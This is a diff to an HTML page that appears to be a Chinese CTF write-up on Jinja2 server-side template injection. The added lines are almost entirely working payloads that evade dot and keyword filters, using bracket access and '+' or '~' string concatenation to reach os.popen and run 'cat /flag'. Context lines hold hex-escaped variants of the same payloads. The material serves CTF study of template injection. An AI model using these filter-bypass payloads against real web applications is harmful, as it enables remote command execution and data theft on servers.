@@ -488,6 +488,28 @@ code=&#123;&#123;()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f
 code=&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[117]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('cat /flag').read()&#125;&#125;
 </code></pre>
 <p>base64编码和格式化字符串 绕过就不手打了,一定不是我懒(逃<br><img src="https://i0.hdslb.com/bfs/article/974acde170f465877f159abaed10a6e1290349942.png"><br><img src="https://i0.hdslb.com/bfs/article/38eae5822a2e363cd0429d91f669d822290349942.png"></p>
+<h2 id="点过滤"><a href="#点过滤" class="headerlink" title="点过滤"></a>点过滤</h2><h3 id="attr过滤"><a href="#attr过滤" class="headerlink" title="attr过滤"></a>attr过滤</h3><p>attr没有使用点和中括号</p>
+<h3 id="用中括号代替点"><a href="#用中括号代替点" class="headerlink" title="用中括号代替点"></a>用中括号代替点</h3><p>payload:</p>
+<pre><code>
+code=&#123;&#123;()['__class__']['__base__']['__subclasses__']()[117]['__init__']['__globals__']['popen']('cat /flag')['read']()&#125;&#125;
+</code></pre>
+<h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><h3 id="“-”拼接"><a href="#“-”拼接" class="headerlink" title="“+”拼接"></a>“+”拼接</h3><p>使用<code>+</code>号拼接字符串</p>
+<p>pyload:</p>
+<pre><code>
+&#123;&#123;()['__class__']&#125;&#125;----&gt;&#123;&#123;()['__cla'+'ss__']&#125;&#125;
+
+code=&#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[117]['__in'+'it__']['__glo'+'bals__']['po'+'pen']('cat /flag')['re'+'ad']()&#125;&#125;
+</code></pre>
+<h3 id="jinjia2中的”-”拼接"><a href="#jinjia2中的”-”拼接" class="headerlink" title="jinjia2中的”~”拼接"></a>jinjia2中的”~”拼接</h3><p>在jinjia2中<code>~</code>可以拼接字符</p>
+<p>payload:</p>
+<pre><code>
+&#123;%set a='__cla'%&#125;&#123;%set b='ss__'%&#125;&#123;%set c='__in'%&#125;&#123;%set d='it__'%&#125;&#123;&#123;()[a~b][c~d]&#125;&#125;
+
+&#123;%set a='__cla'%&#125;&#123;%set b='ss__'%&#125;&#123;%set c='__ba'%&#125;&#123;%set d='se__'%&#125;&#123;%set e='__subcla'%&#125;&#123;%set f='sses__'%&#125;&#123;%set g='__in'%&#125;&#123;%set h='it__'%&#125;&#123;%set i='__glo'%&#125;&#123;%set j='bals__'%&#125;&#123;%set k='po'%&#125;&#123;%set l='pen'%&#125;&#123;&#123;()[a~b][c~d][e~f]()[199][g~h][i~j]['os'][k~l]('cat /flag')['read']()&#125;&#125;
+
+# 逆天payload
+
+</code></pre>
 
         </div>
         <!-- .entry-content -->
